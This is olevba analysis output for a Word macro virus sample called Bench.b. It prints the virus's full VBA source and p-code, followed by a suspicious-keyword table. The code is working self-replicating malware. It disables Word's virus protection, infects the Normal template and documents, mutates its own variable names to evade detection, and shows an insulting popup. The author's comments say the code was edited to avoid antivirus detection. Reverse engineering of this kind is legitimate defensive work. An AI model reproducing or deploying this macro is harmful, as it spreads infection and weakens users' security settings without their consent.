olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bench.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bench.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled: Options.SaveNormalPrompt = False: Options.VirusProtection = False: Options.ConfirmConversions = False
UC589892 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
TH700659 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Month(Now) = Minute(Now) Then
Randomize: For GE49852 = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue: Selection.ShapeRange.Fill.Solid: Next GE49852:
    With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "[Bench] Macro Virus"
    .Text = "I think " & Application.UserName & " is a big jerk!"
    .Show
    End With
End If
If UC589892 > 0 And TH700659 > 0 Then GoTo OUT
If UC589892 = 0 Then
Set NQ29828 = ActiveDocument.VBProject.VBComponents.Item(1)
BJ130187 = True
End If
If TH700659 = 0 Then
Set NQ29828 = NormalTemplate.VBProject.VBComponents.Item(1)
UT693382 = True
End If
Call EK188861_IU590694
ActiveDocument.Saved = True
If UT693382 <> True And BJ130187 <> True Then GoTo OUT
If UT693382 = True Then NQ29828.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UC589892 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub")
If BJ130187 = True Then NQ29828.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TH700659 - 1))
OUT:
If TH700659 <> 0 And UC589892 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Sub EK188861_IU590694()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "AE61796"
r1(2) = "SP71387"
r1(3) = "PR817783"
r1(4) = "SE396324"
r1(5) = "IU590694"
r1(6) = "EK188861"
r1(7) = "IB228241"
r1(8) = "IN469284"
r1(9) = "UC589892"
r1(10) = "TH700659"
r1(11) = "NQ29828"
r1(12) = "BJ130187"
r1(13) = "UT693382"
r1(14) = "GE49852"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 900) & Int(Rnd * 900)
Call IU590694(a1, r1(x))
Next x
End Sub
Private Sub IU590694(IN469284, IB228241 As String)  'VAMP v1.0 [Thanks VicodinES]
On Error Resume Next
Dim AE61796 As Long: Dim SP71387 As Long: Dim PR817783 As Long: Dim SE396324 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
AE61796 = 1: SP71387 = 1: PR817783 = .CountOfLines: SE396324 = Len(.Lines(.CountOfLines, 1))
Do While .Find(IB228241, AE61796, SP71387, PR817783, SE396324, True)
s1 = .Lines(AE61796, 1)
s1 = Left(s1, SP71387 - 1) & IN469284 & Mid(s1, SE396324)
.replaceline AE61796, s1
AE61796 = PR817783 + 1: SP71387 = 1
PR817783 = .CountOfLines
SE396324 = Len(.Lines(.CountOfLines, 1))
Loop
End With
' BMV Strain B - Added Vic's Polymorph Engine - VAMP [Thanks Vic!]
'              - Payload from W97M/PSD - Why? Coz I liked it!
'              - The next strain's payload I'm gonna put more graphics [created by me] And more original code! - Like what Vic says "Be creative!" - I'm sure I haven't done that! =(
'              - Hacked CPCK code - I'm just learning Class Object infection ok! Though I had to edit some stuff so that AVP won't detect it
'              - I want to make a virus everyone wouldn't mind having
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bench.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8944 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #3:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St UC589892 
' Line #4:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St TH700659 
' Line #5:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #6:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld GE49852 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #7:
' 	Ld msoShapePentagon 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #9:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' 	BoS 0x0000 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld GE49852 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' Line #10:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #11:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #12:
' 	LitStr 0x0013 "[Bench] Macro Virus"
' 	MemStWith Heading 
' Line #13:
' 	LitStr 0x0008 "I think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000F " is a big jerk!"
' 	Concat 
' 	MemStWith Then 
' Line #14:
' 	ArgsMemCallWith Show 0x0000 
' Line #15:
' 	EndWith 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld UC589892 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld TH700659 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo OUT 
' 	EndIf 
' Line #18:
' 	Ld UC589892 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NQ29828 
' Line #20:
' 	LitVarSpecial (True)
' 	St BJ130187 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld TH700659 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NQ29828 
' Line #24:
' 	LitVarSpecial (True)
' 	St UT693382 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	ArgsCall (Call) EK188861_IU590694 0x0000 
' Line #27:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #28:
' 	Ld UT693382 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld BJ130187 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo OUT 
' 	EndIf 
' Line #29:
' 	Ld UT693382 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld UC589892 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "Sub FileTemplates()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Paren 
' 	Ld NQ29828 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #30:
' 	Ld BJ130187 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld TH700659 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld NQ29828 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #31:
' 	Label OUT 
' Line #32:
' 	Ld TH700659 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld UC589892 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Private Sub EK188861_IU590694())
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	ArgsCall Read 0x0000 
' Line #37:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn r1 (As String)
' Line #38:
' 	LitStr 0x0007 "AE61796"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' Line #39:
' 	LitStr 0x0007 "SP71387"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' Line #40:
' 	LitStr 0x0008 "PR817783"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' Line #41:
' 	LitStr 0x0008 "SE396324"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' Line #42:
' 	LitStr 0x0008 "IU590694"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' Line #43:
' 	LitStr 0x0008 "EK188861"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' Line #44:
' 	LitStr 0x0008 "IB228241"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' Line #45:
' 	LitStr 0x0008 "IN469284"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' Line #46:
' 	LitStr 0x0008 "UC589892"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' Line #47:
' 	LitStr 0x0008 "TH700659"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' Line #48:
' 	LitStr 0x0007 "NQ29828"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' Line #49:
' 	LitStr 0x0008 "BJ130187"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' Line #50:
' 	LitStr 0x0008 "UT693382"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' Line #51:
' 	LitStr 0x0007 "GE49852"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' Line #52:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #53:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0384 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0384 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #54:
' 	Ld a1 
' 	Ld x 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) IU590694 0x0002 
' Line #55:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Private Sub IU590694(IN469284, IB228241 As String))
' 	QuoteRem 0x0034 0x001C "VAMP v1.0 [Thanks VicodinES]"
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	Dim 
' 	VarDefn AE61796 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn SP71387 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn PR817783 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn SE396324 (As Long)
' Line #60:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #61:
' 	LitDI2 0x0001 
' 	St AE61796 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St SP71387 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St PR817783 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St SE396324 
' Line #62:
' 	Ld IB228241 
' 	Ld AE61796 
' 	Ld SP71387 
' 	Ld PR817783 
' 	Ld SE396324 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #63:
' 	Ld AE61796 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St s1 
' Line #64:
' 	Ld s1 
' 	Ld SP71387 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld IN469284 
' 	Concat 
' 	Ld s1 
' 	Ld SE396324 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St s1 
' Line #65:
' 	Ld AE61796 
' 	Ld s1 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #66:
' 	Ld PR817783 
' 	LitDI2 0x0001 
' 	Add 
' 	St AE61796 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St SP71387 
' Line #67:
' 	MemLdWith CountOfLines 
' 	St PR817783 
' Line #68:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St SE396324 
' Line #69:
' 	Loop 
' Line #70:
' 	EndWith 
' Line #71:
' 	QuoteRem 0x0000 0x0041 " BMV Strain B - Added Vic's Polymorph Engine - VAMP [Thanks Vic!]"
' Line #72:
' 	QuoteRem 0x0000 0x003C "              - Payload from W97M/PSD - Why? Coz I liked it!"
' Line #73:
' 	QuoteRem 0x0000 0x00B4 "              - The next strain's payload I'm gonna put more graphics [created by me] And more original code! - Like what Vic says "Be creative!" - I'm sure I haven't done that! =("
' Line #74:
' 	QuoteRem 0x0000 0x008B "              - Hacked CPCK code - I'm just learning Class Object infection ok! Though I had to edit some stuff so that AVP won't detect it"
' Line #75:
' 	QuoteRem 0x0000 0x0044 "              - I want to make a virus everyone wouldn't mind having"
' Line #76:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

